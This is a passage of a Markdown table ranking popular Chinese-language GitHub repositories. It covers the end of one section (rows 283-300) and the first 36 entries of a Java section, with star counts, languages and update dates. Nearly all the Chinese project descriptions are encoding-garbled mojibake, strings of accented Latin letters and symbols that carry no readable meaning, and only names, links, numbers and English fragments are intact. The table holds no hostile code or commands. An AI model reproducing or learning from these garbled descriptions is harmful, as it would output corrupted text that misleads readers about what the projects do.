|283|[easzlab/kubeasz](https://github.com/easzlab/kubeasz)|‰ΩøÁî®AnsibleËÑöÊú¨ÂÆâË£ÖK8SÈõÜÁæ§Ôºå‰ªãÁªçÁªÑ‰ª∂‰∫§‰∫íÂéüÁêÜÔºåÊñπ‰æøÁõ¥Êé•Ôºå‰∏çÂèóÂõΩÂÜÖÁΩëÁªúÁéØÂ¢ÉÂΩ±Âìç|6.2k|HTML|10/29|
|284|[phodal/github](https://github.com/phodal/github)|GitHub Êº´Ê∏∏ÊåáÂçó- a Chinese ebook on how to build a good project on Github. Explore the users' behavior. Find some thing interest.|6.1k|Rich Text Format|06/14|
|285|[OpenFlutter/Flutter-Notebook](https://github.com/OpenFlutter/Flutter-Notebook)|FlutterDemoÂêàÈõÜÔºå‰ªäÂ§©‰Ω†fu‰∫ÜÂêó|6.1k|Dart|10/01|
|286|[1c7/Crash-Course-Computer-Science-Chinese](https://github.com/1c7/Crash-Course-Computer-Science-Chinese)|:computer: ËÆ°ÁÆóÊú∫ÈÄüÊàêËØæ   Crash Course Â≠óÂπïÁªÑ (ÂÖ®40ÈõÜ 2018-5-1 Á≤æÊ†°ÂÆåÊàê)|6.1k|JavaScript|07/02|
|287|[gedoor/MyBookshelf](https://github.com/gedoor/MyBookshelf)|ÈòÖËØªÊòØ‰∏ÄÊ¨æÂèØ‰ª•Ëá™ÂÆö‰πâÊù•Ê∫êÈòÖËØªÁΩëÁªúÂÜÖÂÆπÁöÑÂ∑•ÂÖ∑Ôºå‰∏∫ÂπøÂ§ßÁΩëÁªúÊñáÂ≠¶Áà±Â•ΩËÄÖÊèê‰æõ‰∏ÄÁßçÊñπ‰æø„ÄÅÂø´Êç∑ËàíÈÄÇÁöÑËØïËØª‰ΩìÈ™å„ÄÇ|6.1k|Java|10/28|
|288|[ElemeFE/v-charts](https://github.com/ElemeFE/v-charts)|Âü∫‰∫é Vue2.0 Âíå ECharts Â∞ÅË£ÖÁöÑÂõæË°®ÁªÑ‰ª∂üìàüìä|6.1k|JavaScript|08/26|
|289|[jindongwang/transferlearning](https://github.com/jindongwang/transferlearning)|Everything about Transfer Learning and Domain Adaptation--ËøÅÁßªÂ≠¶‰π†|6.1k|Python|10/25|
|290|[xtyxtyx/sorry](https://github.com/xtyxtyx/sorry)|Âú®Á∫øÂà∂‰Ωú`sorry ‰∏∫ÊâÄÊ¨≤‰∏∫`ÁöÑgif|6.1k|CSS|04/03|
|291|[c-hj/SJTU-Courses](https://github.com/c-hj/SJTU-Courses)|‰∏äÊµ∑‰∫§ÈÄöÂ§ßÂ≠¶ËØæÁ®ãËµÑÊñôÂàÜ‰∫´|6.1k|-|04/17|
|292|[EZLippi/Tinyhttpd](https://github.com/EZLippi/Tinyhttpd)|Tinyhttpd ÊòØJ. David BlackstoneÂú®1999Âπ¥ÂÜôÁöÑ‰∏Ä‰∏™‰∏çÂà∞ 500 Ë°åÁöÑË∂ÖËΩªÈáèÂûã Http ServerÔºåÁî®Êù•Â≠¶‰π†ÈùûÂ∏∏‰∏çÈîôÔºåÂèØ‰ª•Â∏ÆÂä©Êàë‰ª¨ÁúüÊ≠£ÁêÜËß£ÊúçÂä°Âô®Á®ãÂ∫èÁöÑÊú¨Ë¥®„ÄÇÂÆòÁΩë:http://tinyhttpd.sourceforge.net|6.0k|C|06/16|
|293|[OI-wiki/OI-wiki](https://github.com/OI-wiki/OI-wiki)|:star2: Wiki of OI / ICPC for everyone. ÔºàÊüêÂ§ßÂûãÊ∏∏ÊàèÁ∫ø‰∏äÊîªÁï•ÔºåÂÜÖÂê´ÁÇ´ÈÖ∑ÁÆóÊúØÈ≠îÊ≥ïÔºâ|6.0k|-|10/30|
|294|[huiyadanli/RevokeMsgPatcher](https://github.com/huiyadanli/RevokeMsgPatcher)|:trollface: A hex editor for WeChat/QQ/TIM - PCÁâàÂæÆ‰ø°/QQ/TIMÈò≤Êí§ÂõûË°•‰∏ÅÔºàÊàëÂ∑≤ÁªèÁúãÂà∞‰∫ÜÔºåÊí§Âõû‰πüÊ≤°Áî®‰∫ÜÔºâ|6.0k|C#|10/14|
|295|[chuzhixin/vue-admin-beautiful](https://github.com/chuzhixin/vue-admin-beautiful)|üöÄüöÄüöÄvue3.0,vue3,vue3.x,vue.js,ÂêéÂè∞ÁÆ°ÁêÜÔºågithubÂºÄÊ∫êadmin‰∏≠ÊúÄ‰ºòÁßÄÁöÑvue3.0ÈõÜÊàêÊ°ÜÊû∂‰πã‰∏ÄÔºåÂÆÉÊòØÂõΩÂÜÖÈ¶ñ‰∏™Âü∫‰∫évue3.0 + antdvÁöÑÂºÄÊ∫êadminÈ°πÁõÆÔºåÂêåÊó∂ÊîØÊåÅÁîµËÑëÔºåÊâãÊú∫ÔºåÂπ≥ÊùøÔºåüî•üî•üî•vue3.0-antdvÂàÜÊîØ‰ΩøÁî®vue3.xÂºÄÂèëÔºåmasterÂàÜÊîØ‰ΩøÁî®ÁöÑÊòØvue2.xÂºÄÂèë|6.0k|Vue|10/28|
|296|[injetlee/Python](https://github.com/injetlee/Python)|PythonËÑöÊú¨„ÄÇÊ®°ÊãüÁôªÂΩïÁü•‰πéÔºå Áà¨Ëô´ÔºåÊìç‰ΩúexcelÔºåÂæÆ‰ø°ÂÖ¨‰ºóÂè∑ÔºåËøúÁ®ãÂºÄÊú∫|5.9k|Python|10/07|
|297|[chyingp/nodejs-learning-guide](https://github.com/chyingp/nodejs-learning-guide)|NodejsÂ≠¶‰π†Á¨îËÆ∞‰ª•ÂèäÁªèÈ™åÊÄªÁªìÔºåÂÖ¨‰ºóÂè∑""Á®ãÂ∫èÁåøÂ∞èÂç°""|5.9k|Ruby|07/08|
|298|[Exrick/xmall](https://github.com/Exrick/xmall)|Âü∫‰∫éSOAÊû∂ÊûÑÁöÑÂàÜÂ∏ÉÂºèÁîµÂïÜË¥≠Áâ©ÂïÜÂüé ÂâçÂêéÁ´ØÂàÜÁ¶ª ÂâçÂè∞ÂïÜÂüé:VueÂÖ®ÂÆ∂Ê°∂ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü:Dubbo/SSM/Elasticsearch/Redis/MySQL/ActiveMQ/Shiro/ZookeeperÁ≠â|5.9k|Java|10/13|
|299|[opsnull/follow-me-install-kubernetes-cluster](https://github.com/opsnull/follow-me-install-kubernetes-cluster)|ÂíåÊàë‰∏ÄÊ≠•Ê≠•ÈÉ®ÁΩ≤ kubernetes ÈõÜÁæ§|5.9k|Shell|09/22|
|300|[gsdios/SDCycleScrollView](https://github.com/gsdios/SDCycleScrollView)|Autoscroll Banner.   Êó†ÈôêÂæ™ÁéØÂõæÁâá„ÄÅÊñáÂ≠óËΩÆÊí≠Âô®„ÄÇ|5.9k|Objective-C|09/27|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)

<br/>

## Java

|#|Repository|Description|Stars|Language|Updated|
|:-|:-|:-|:-|:-|:-|
|1|[CyC2018/CS-Notes](https://github.com/CyC2018/CS-Notes)|:books: ÊäÄÊúØÈù¢ËØïÂøÖÂ§áÂü∫Á°ÄÁü•ËØÜ„ÄÅLeetcode„ÄÅËÆ°ÁÆóÊú∫Êìç‰ΩúÁ≥ªÁªü„ÄÅËÆ°ÁÆóÊú∫ÁΩëÁªú„ÄÅÁ≥ªÁªüËÆæËÆ°„ÄÅJava„ÄÅPython„ÄÅC++|113.6k|Java|10/29|
|2|[Snailclimb/JavaGuide](https://github.com/Snailclimb/JavaGuide)|„ÄåJavaÂ≠¶‰π†+Èù¢ËØïÊåáÂçó„Äç‰∏Ä‰ªΩÊ∂µÁõñÂ§ßÈÉ®ÂàÜJavaÁ®ãÂ∫èÂëòÊâÄÈúÄË¶ÅÊéåÊè°ÁöÑÊ†∏ÂøÉÁü•ËØÜ„ÄÇÂáÜÂ§á Java Èù¢ËØïÔºåÈ¶ñÈÄâ JavaGuideÔºÅ|90.7k|Java|10/29|
|3|[MisterBooo/LeetCodeAnimation](https://github.com/MisterBooo/LeetCodeAnimation)|Demonstrate all the questions on LeetCode in the form of animation.ÔºàÁî®Âä®ÁîªÁöÑÂΩ¢ÂºèÂëàÁé∞Ëß£LeetCodeÈ¢òÁõÆÁöÑÊÄùË∑ØÔºâ|60.3k|Java|09/30|
|4|[doocs/advanced-java](https://github.com/doocs/advanced-java)|üòÆ ‰∫íËÅîÁΩë Java Â∑•Á®ãÂ∏àËøõÈò∂Áü•ËØÜÂÆåÂÖ®Êâ´Áõ≤ÔºöÊ∂µÁõñÈ´òÂπ∂Âèë„ÄÅÂàÜÂ∏ÉÂºè„ÄÅÈ´òÂèØÁî®„ÄÅÂæÆÊúçÂä°„ÄÅÊµ∑ÈáèÊï∞ÊçÆÂ§ÑÁêÜÁ≠âÈ¢ÜÂüüÁü•ËØÜÔºåÂêéÁ´ØÂêåÂ≠¶ÂøÖÁúãÔºåÂâçÁ´ØÂêåÂ≠¶‰πüÂèØÂ≠¶‰π†|49.1k|Java|10/28|
|5|[macrozheng/mall](https://github.com/macrozheng/mall)|mallÈ°πÁõÆÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºåÂåÖÊã¨ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂèäÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂü∫‰∫éSpringBoot+MyBatisÂÆûÁé∞ÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ ÂâçÂè∞ÂïÜÂüéÁ≥ªÁªüÂåÖÂê´È¶ñÈ°µÈó®Êà∑„ÄÅÂïÜÂìÅÊé®Ëçê„ÄÅÂïÜÂìÅÊêúÁ¥¢„ÄÅÂïÜÂìÅÂ±ïÁ§∫„ÄÅË¥≠Áâ©ËΩ¶„ÄÅËÆ¢ÂçïÊµÅÁ®ã„ÄÅ‰ºöÂëò‰∏≠ÂøÉ„ÄÅÂÆ¢Êà∑ÊúçÂä°„ÄÅÂ∏ÆÂä©‰∏≠ÂøÉÁ≠âÊ®°Âùó„ÄÇ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÂåÖÂê´ÂïÜÂìÅÁÆ°ÁêÜ„ÄÅËÆ¢ÂçïÁÆ°ÁêÜ„ÄÅ‰ºöÂëòÁÆ°ÁêÜ„ÄÅ‰øÉÈîÄÁÆ°ÁêÜ„ÄÅËøêËê•ÁÆ°ÁêÜ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÁªüËÆ°Êä•Ë°®„ÄÅË¥¢Âä°ÁÆ°ÁêÜ„ÄÅÊùÉÈôêÁÆ°ÁêÜ„ÄÅËÆæÁΩÆÁ≠âÊ®°Âùó„ÄÇ|42.8k|Java|10/29|
|6|[kon9chunkit/GitHub-Chinese-Top-Charts](https://github.com/kon9chunkit/GitHub-Chinese-Top-Charts)|:cn: GitHub‰∏≠ÊñáÊéíË°åÊ¶úÔºåÂ∏ÆÂä©‰Ω†ÂèëÁé∞È´òÂàÜ‰ºòÁßÄ‰∏≠ÊñáÈ°πÁõÆ„ÄÅÊõ¥È´òÊïàÂú∞Âê∏Êî∂ÂõΩ‰∫∫ÁöÑ‰ºòÁßÄÁªèÈ™åÊàêÊûúÔºõÊ¶úÂçïÊØèÂë®Êõ¥Êñ∞‰∏ÄÊ¨°ÔºåÊï¨ËØ∑ÂÖ≥Ê≥®ÔºÅ|25.7k|Java|10/24|
|7|[proxyee-down-org/proxyee-down](https://github.com/proxyee-down-org/proxyee-down)|http‰∏ãËΩΩÂ∑•ÂÖ∑ÔºåÂü∫‰∫éhttp‰ª£ÁêÜÔºåÊîØÊåÅÂ§öËøûÊé•ÂàÜÂùó‰∏ãËΩΩ|25.5k|Java|08/11|
|8|[ityouknow/spring-boot-examples](https://github.com/ityouknow/spring-boot-examples)|about learning Spring Boot via examples. Spring Boot ÊïôÁ®ã„ÄÅÊäÄÊúØÊ†àÁ§∫‰æã‰ª£Á†ÅÔºåÂø´ÈÄüÁÆÄÂçï‰∏äÊâãÊïôÁ®ã„ÄÇ |23.9k|Java|10/19|
|9|[alibaba/arthas](https://github.com/alibaba/arthas)|Alibaba Java Diagnostic Tool Arthas/Alibaba JavaËØäÊñ≠Âà©Âô®Arthas|23.5k|Java|10/29|
|10|[ctripcorp/apollo](https://github.com/ctripcorp/apollo)|ApolloÔºàÈòøÊ≥¢ÁΩóÔºâÊòØÊê∫Á®ãÊ°ÜÊû∂ÈÉ®Èó®Á†îÂèëÁöÑÂàÜÂ∏ÉÂºèÈÖçÁΩÆ‰∏≠ÂøÉÔºåËÉΩÂ§üÈõÜ‰∏≠ÂåñÁÆ°ÁêÜÂ∫îÁî®‰∏çÂêåÁéØÂ¢É„ÄÅ‰∏çÂêåÈõÜÁæ§ÁöÑÈÖçÁΩÆÔºåÈÖçÁΩÆ‰øÆÊîπÂêéËÉΩÂ§üÂÆûÊó∂Êé®ÈÄÅÂà∞Â∫îÁî®Á´ØÔºåÂπ∂‰∏îÂÖ∑Â§áËßÑËåÉÁöÑÊùÉÈôê„ÄÅÊµÅÁ®ãÊ≤ªÁêÜÁ≠âÁâπÊÄßÔºåÈÄÇÁî®‰∫éÂæÆÊúçÂä°ÈÖçÁΩÆÁÆ°ÁêÜÂú∫ÊôØ„ÄÇ|22.7k|Java|10/24|
|11|[alibaba/druid](https://github.com/alibaba/druid)|ÈòøÈáåÂ∑¥Â∑¥ËÆ°ÁÆóÂπ≥Âè∞‰∫ã‰∏öÈÉ®Âá∫ÂìÅÔºå‰∏∫ÁõëÊéßËÄåÁîüÁöÑÊï∞ÊçÆÂ∫ìËøûÊé•Ê±†|22.5k|Java|10/25|
|12|[scwang90/SmartRefreshLayout](https://github.com/scwang90/SmartRefreshLayout)|üî•‰∏ãÊãâÂà∑Êñ∞„ÄÅ‰∏äÊãâÂä†ËΩΩ„ÄÅ‰∫åÁ∫ßÂà∑Êñ∞„ÄÅÊ∑òÂÆù‰∫åÊ•º„ÄÅRefreshLayout„ÄÅOverScrollÔºåAndroidÊô∫ËÉΩ‰∏ãÊãâÂà∑Êñ∞Ê°ÜÊû∂ÔºåÊîØÊåÅË∂äÁïåÂõûÂºπ„ÄÅË∂äÁïåÊãñÂä®ÔºåÂÖ∑ÊúâÊûÅÂº∫ÁöÑÊâ©Â±ïÊÄßÔºåÈõÜÊàê‰∫ÜÂá†ÂçÅÁßçÁÇ´ÈÖ∑ÁöÑHeaderÂíå Footer„ÄÇ|21.7k|Java|10/18|
|13|[geekxh/hello-algorithm](https://github.com/geekxh/hello-algorithm)|üåç ‰∏úÂçäÁêÉÊúÄÈÖ∑ÁöÑÂ≠¶‰π†È°πÁõÆ   1„ÄÅÊàëÂÜôÁöÑ‰∏âÂçÅ‰∏áÂ≠óÁÆóÊ≥ïÂõæËß£ 2„ÄÅÂçÉÊú¨ÂºÄÊ∫êÁîµÂ≠ê‰π¶ 3„ÄÅ100 Âº†ÊÄùÁª¥ÂØºÂõæ 4„ÄÅ100 ÁØáÂ§ßÂéÇÈù¢Áªè 5„ÄÅ30 ‰∏™Â≠¶‰π†‰∏ìÈ¢ò  üöÄ üöÄ üöÄ Âè≥‰∏äËßíÁÇπ‰∏™ starÔºåÂä†ÂÖ•Êàë‰ª¨‰∏á‰∫∫Â≠¶‰π†Áæ§ÔºÅEnglish SupportedÔºÅ|19.7k|Java|10/25|
|14|[lenve/vhr](https://github.com/lenve/vhr)|ÂæÆ‰∫∫‰∫ãÊòØ‰∏Ä‰∏™ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰∫∫ÂäõËµÑÊ∫êÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®SpringBoot+VueÂºÄÂèë„ÄÇ|19.0k|Java|10/15|
|15|[xkcoding/spring-boot-demo](https://github.com/xkcoding/spring-boot-demo)|spring boot demo ÊòØ‰∏Ä‰∏™Áî®Êù•Ê∑±Â∫¶Â≠¶‰π†Âπ∂ÂÆûÊàò spring boot ÁöÑÈ°πÁõÆÔºåÁõÆÂâçÊÄªÂÖ±ÂåÖÂê´ 65 ‰∏™ÈõÜÊàêdemoÔºåÂ∑≤ÁªèÂÆåÊàê 53 ‰∏™„ÄÇ  ËØ•È°πÁõÆÂ∑≤ÊàêÂäüÈõÜÊàê actuator(ÁõëÊéß)„ÄÅadmin(ÂèØËßÜÂåñÁõëÊéß)„ÄÅlogback(Êó•Âøó)„ÄÅaopLog(ÈÄöËøáAOPËÆ∞ÂΩïwebËØ∑Ê±ÇÊó•Âøó)„ÄÅÁªü‰∏ÄÂºÇÂ∏∏Â§ÑÁêÜ(jsonÁ∫ßÂà´ÂíåÈ°µÈù¢Á∫ßÂà´)„ÄÅfreemarker(Ê®°ÊùøÂºïÊìé)„ÄÅthymeleaf(Ê®°ÊùøÂºïÊìé)„ÄÅBeetl(Ê®°ÊùøÂºïÊìé)„ÄÅEnjoy(Ê®°ÊùøÂºïÊìé)„ÄÅJdbcTemplate(ÈÄöÁî®JDBCÊìç‰ΩúÊï∞ÊçÆÂ∫ì)„ÄÅJPA(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅmybatis(Âº∫Â§ßÁöÑORMÊ°ÜÊû∂)„ÄÅÈÄöÁî®Mapper(Âø´ÈÄüÊìç‰ΩúMybati ...|18.6k|Java|10/27|
|16|[hollischuang/toBeTopJavaer](https://github.com/hollischuang/toBeTopJavaer)|To Be Top Javaer - JavaÂ∑•Á®ãÂ∏àÊàêÁ•û‰πãË∑Ø|17.9k|Java|10/25|
|17|[alibaba/easyexcel](https://github.com/alibaba/easyexcel)|Âø´ÈÄü„ÄÅÁÆÄÂçïÈÅøÂÖçOOMÁöÑjavaÂ§ÑÁêÜExcelÂ∑•ÂÖ∑|17.4k|Java|10/27|
|18|[qiurunze123/miaosha](https://github.com/qiurunze123/miaosha)|‚≠ê‚≠ê‚≠ê‚≠êÁßíÊùÄÁ≥ªÁªüËÆæËÆ°‰∏éÂÆûÁé∞.‰∫íËÅîÁΩëÂ∑•Á®ãÂ∏àËøõÈò∂‰∏éÂàÜÊûêüôãüêì|17.2k|Java|10/19|
|19|[wuyouzhuguli/SpringAll](https://github.com/wuyouzhuguli/SpringAll)|Âæ™Â∫èÊ∏êËøõÔºåÂ≠¶‰π†Spring Boot„ÄÅSpring Boot & Shiro„ÄÅSpring Batch„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅSpring Security & Spring Security OAuth2ÔºåÂçöÂÆ¢SpringÁ≥ªÂàóÊ∫êÁ†ÅÔºöhttps://mrbird.cc|17.1k|Java|05/13|
|20|[halo-dev/halo](https://github.com/halo-dev/halo)|‚úç  An excellent open source blog publishing application.   ‰∏Ä‰∏™‰ºòÁßÄÁöÑÂºÄÊ∫êÂçöÂÆ¢ÂèëÂ∏ÉÂ∫îÁî®„ÄÇ|17.1k|Java|10/30|
|21|[zhangdaiscott/jeecg-boot](https://github.com/zhangdaiscott/jeecg-boot)|Âü∫‰∫é‰ª£Á†ÅÁîüÊàêÂô®ÁöÑ‰Ωé‰ª£Á†ÅÂπ≥Âè∞ÔºåË∂ÖË∂ä‰º†ÁªüÂïÜ‰∏öÂπ≥Âè∞ÔºÅÂâçÂêéÁ´ØÂàÜÁ¶ªÊû∂ÊûÑÔºöSpringBoot 2.xÔºåSpringCloud AlibabaÔºåAnt Design&VueÔºåMybatis-plusÔºåShiroÔºåJWT„ÄÇÂº∫Â§ßÁöÑ‰ª£Á†ÅÁîüÊàêÂô®ËÆ©ÂâçÂêéÁ´Ø‰ª£Á†Å‰∏ÄÈîÆÁîüÊàêÔºåÊó†ÈúÄÂÜô‰ªª‰Ωï‰ª£Á†Å! ÂºïÈ¢ÜÊñ∞ÂºÄÂèëÊ®°Âºè(OnlineCoding-> ‰ª£Á†ÅÁîüÊàê-> ÊâãÂ∑•MERGE)ÔºåÂ∏ÆÂä©JavaÈ°πÁõÆËß£ÂÜ≥70%ÈáçÂ§çÂ∑•‰ΩúÔºåËÆ©ÂºÄÂèëÊõ¥ÂÖ≥Ê≥®‰∏öÂä°ÈÄªËæëÔºåÊó¢ËÉΩÂø´ÈÄüÊèêÈ´òÂºÄÂèëÊïàÁéáÔºåÂ∏ÆÂä©ÂÖ¨Âè∏ËäÇÁúÅÊàêÊú¨ÔºåÂêåÊó∂Âèà‰∏çÂ§±ÁÅµÊ¥ªÊÄß„ÄÇ|16.8k|Java|10/29|
|22|[alibaba/canal](https://github.com/alibaba/canal)|ÈòøÈáåÂ∑¥Â∑¥ MySQL binlog Â¢ûÈáèËÆ¢ÈòÖ&Ê∂àË¥πÁªÑ‰ª∂ |16.3k|Java|10/29|
|23|[xuxueli/xxl-job](https://github.com/xuxueli/xxl-job)|A distributed task scheduling framework.ÔºàÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶Âπ≥Âè∞XXL-JOBÔºâ|16.1k|Java|10/29|
|24|[didi/DoraemonKit](https://github.com/didi/DoraemonKit)|A full-featured App (iOS & Android) development assistant. You deserve it.  ÁÆÄÁß∞ ""DoKit"" „ÄÇ‰∏ÄÊ¨æÂäüËÉΩÈΩêÂÖ®ÁöÑÂÆ¢Êà∑Á´ØÔºà iOS „ÄÅAndroid„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è ÔºâÁ†îÂèëÂä©ÊâãÔºå‰Ω†ÂÄºÂæóÊã•Êúâ„ÄÇhttps://www.dokit.cn/|15.8k|Java|10/29|
|25|[shuzheng/zheng](https://github.com/shuzheng/zheng)|Âü∫‰∫éSpring+SpringMVC+MybatisÂàÜÂ∏ÉÂºèÊïèÊç∑ÂºÄÂèëÁ≥ªÁªüÊû∂ÊûÑÔºåÊèê‰æõÊï¥Â•óÂÖ¨ÂÖ±ÂæÆÊúçÂä°ÊúçÂä°Ê®°ÂùóÔºöÈõÜ‰∏≠ÊùÉÈôêÁÆ°ÁêÜÔºàÂçïÁÇπÁôªÂΩïÔºâ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÊîØ‰ªò‰∏≠ÂøÉ„ÄÅÁî®Êà∑ÁÆ°ÁêÜÔºàÊîØÊåÅÁ¨¨‰∏âÊñπÁôªÂΩïÔºâ„ÄÅÂæÆ‰ø°Âπ≥Âè∞„ÄÅÂ≠òÂÇ®Á≥ªÁªü„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÊó•ÂøóÂàÜÊûê„ÄÅ‰ªªÂä°ÂíåÈÄöÁü•Á≠âÔºåÊîØÊåÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÁõëÊéßÂíåËøΩË∏™ÔºåÂä™Âäõ‰∏∫‰∏≠Â∞èÂûã‰ºÅ‰∏öÊâìÈÄ†ÂÖ®Êñπ‰ΩçJ2EE‰ºÅ‰∏öÁ∫ßÂºÄÂèëËß£ÂÜ≥ÊñπÊ°à„ÄÇ|15.7k|Java|10/13|
|26|[CarGuo/GSYVideoPlayer](https://github.com/CarGuo/GSYVideoPlayer)|ËßÜÈ¢ëÊí≠ÊîæÂô®ÔºàIJKplayer„ÄÅExoPlayer„ÄÅMediaPlayerÔºâÔºåHTTPSÔºåÊîØÊåÅÂºπÂπïÔºåÂ§ñÊåÇÂ≠óÂπïÔºåÊîØÊåÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅgifÊà™ÂõæÔºåÁâáÂ§¥ÂπøÂëä„ÄÅ‰∏≠Èó¥ÂπøÂëäÔºåÂ§ö‰∏™ÂêåÊó∂Êí≠ÊîæÔºåÊîØÊåÅÂü∫Êú¨ÁöÑÊãñÂä®ÔºåÂ£∞Èü≥„ÄÅ‰∫ÆÂ∫¶Ë∞ÉËäÇÔºåÊîØÊåÅËæπÊí≠ËæπÁºìÂ≠òÔºåÊîØÊåÅËßÜÈ¢ëËá™Â∏¶rotationÁöÑÊóãËΩ¨Ôºà90,270‰πãÁ±ªÔºâÔºåÈáçÂäõÊóãËΩ¨‰∏éÊâãÂä®ÊóãËΩ¨ÁöÑÂêåÊ≠•ÊîØÊåÅÔºåÊîØÊåÅÂàóË°®Êí≠Êîæ ÔºåÂàóË°®ÂÖ®Â±èÂä®ÁîªÔºåËßÜÈ¢ëÂä†ËΩΩÈÄüÂ∫¶ÔºåÂàóË°®Â∞èÁ™óÂè£ÊîØÊåÅÊãñÂä®ÔºåÂä®ÁîªÊïàÊûúÔºåË∞ÉÊï¥ÊØî‰æãÔºåÂ§öÂàÜËæ®ÁéáÂàáÊç¢ÔºåÊîØÊåÅÂàáÊç¢Êí≠ÊîæÂô®ÔºåËøõÂ∫¶Êù°Â∞èÁ™óÂè£È¢ÑËßàÔºåÂàóË°®ÂàáÊç¢ËØ¶ÊÉÖÈ°µÈù¢Êó†ÁºùÊí≠ÊîæÔºårtsp„ÄÅconcat„ÄÅmpeg„ÄÇ |15.1k|Java|10/26|
|27|[linlinjava/litemall](https://github.com/linlinjava/litemall)|Âèà‰∏Ä‰∏™Â∞èÂïÜÂüé„ÄÇlitemall = Spring BootÂêéÁ´Ø + VueÁÆ°ÁêÜÂëòÂâçÁ´Ø + ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁî®Êà∑ÂâçÁ´Ø + VueÁî®Êà∑ÁßªÂä®Á´Ø|14.5k|Java|10/28|
|28|[dianping/cat](https://github.com/dianping/cat)|CAT ‰Ωú‰∏∫ÊúçÂä°Á´ØÈ°πÁõÆÂü∫Á°ÄÁªÑ‰ª∂ÔºåÊèê‰æõ‰∫Ü Java, C/C++, Node.js, Python, Go Á≠âÂ§öËØ≠Ë®ÄÂÆ¢Êà∑Á´ØÔºåÂ∑≤ÁªèÂú®ÁæéÂõ¢ÁÇπËØÑÁöÑÂü∫Á°ÄÊû∂ÊûÑ‰∏≠Èó¥‰ª∂Ê°ÜÊû∂ÔºàMVCÊ°ÜÊû∂ÔºåRPCÊ°ÜÊû∂ÔºåÊï∞ÊçÆÂ∫ìÊ°ÜÊû∂ÔºåÁºìÂ≠òÊ°ÜÊû∂Á≠âÔºåÊ∂àÊÅØÈòüÂàóÔºåÈÖçÁΩÆÁ≥ªÁªüÁ≠âÔºâÊ∑±Â∫¶ÈõÜÊàêÔºå‰∏∫ÁæéÂõ¢ÁÇπËØÑÂêÑ‰∏öÂä°Á∫øÊèê‰æõÁ≥ªÁªü‰∏∞ÂØåÁöÑÊÄßËÉΩÊåáÊ†á„ÄÅÂÅ•Â∫∑Áä∂ÂÜµ„ÄÅÂÆûÊó∂ÂëäË≠¶Á≠â„ÄÇ|14.4k|Java|10/13|
|29|[forezp/SpringCloudLearning](https://github.com/forezp/SpringCloudLearning)|„ÄäÂè≤‰∏äÊúÄÁÆÄÂçïÁöÑSpring CloudÊïôÁ®ãÊ∫êÁ†Å„Äã|14.4k|Java|06/10|
|30|[alibaba/Sentinel](https://github.com/alibaba/Sentinel)|A powerful flow control component enabling reliability, resilience and monitoring for microservices. (Èù¢Âêë‰∫ëÂéüÁîüÂæÆÊúçÂä°ÁöÑÈ´òÂèØÁî®ÊµÅÊéßÈò≤Êä§ÁªÑ‰ª∂)|14.2k|Java|10/29|
|31|[JeffLi1993/springboot-learning-example](https://github.com/JeffLi1993/springboot-learning-example)|spring boot ÂÆûË∑µÂ≠¶‰π†Ê°à‰æãÔºåÊòØ spring boot ÂàùÂ≠¶ËÄÖÂèäÊ†∏ÂøÉÊäÄÊúØÂ∑©Âõ∫ÁöÑÊúÄ‰Ω≥ÂÆûË∑µ„ÄÇÂè¶Â§ñÂÜôÂçöÂÆ¢ÔºåÁî® OpenWrite„ÄÇ|13.6k|Java|10/13|
|32|[alibaba/ARouter](https://github.com/alibaba/ARouter)|üí™ A framework for assisting in the renovation of Android componentization (Â∏ÆÂä© Android App ËøõË°åÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑË∑ØÁî±Ê°ÜÊû∂)|12.5k|Java|10/22|
|33|[Tencent/QMUI_Android](https://github.com/Tencent/QMUI_Android)|ÊèêÈ´ò Android UI ÂºÄÂèëÊïàÁéáÁöÑ UI Â∫ì|12.3k|Java|10/28|
|34|[dyc87112/SpringBoot-Learning](https://github.com/dyc87112/SpringBoot-Learning)|Spring BootÂü∫Á°ÄÊïôÁ®ãÔºåSpring Boot 2.xÁâàÊú¨ËøûËΩΩ‰∏≠ÔºÅÔºÅÔºÅ|12.3k|Java|09/11|
|35|[Bigkoo/Android-PickerView](https://github.com/Bigkoo/Android-PickerView)|This is a picker view for android , support linkage effect, timepicker and optionspicker.ÔºàÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®Ôºâ|12.2k|Java|10/23|
|36|[elunez/eladmin](https://github.com/elunez/eladmin)|È°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Jpa„ÄÅ Spring Security„ÄÅredis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®ÂàÜÊ®°ÂùóÂºÄÂèëÊñπÂºèÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåÊîØÊåÅÊï∞ÊçÆÂ≠óÂÖ∏‰∏éÊï∞ÊçÆÊùÉÈôêÁÆ°ÁêÜÔºåÊîØÊåÅ‰∏ÄÈîÆÁîüÊàêÂâçÂêéÁ´Ø‰ª£Á†ÅÔºåÊîØÊåÅÂä®ÊÄÅË∑ØÁî±|11.6k|Java|10/27|
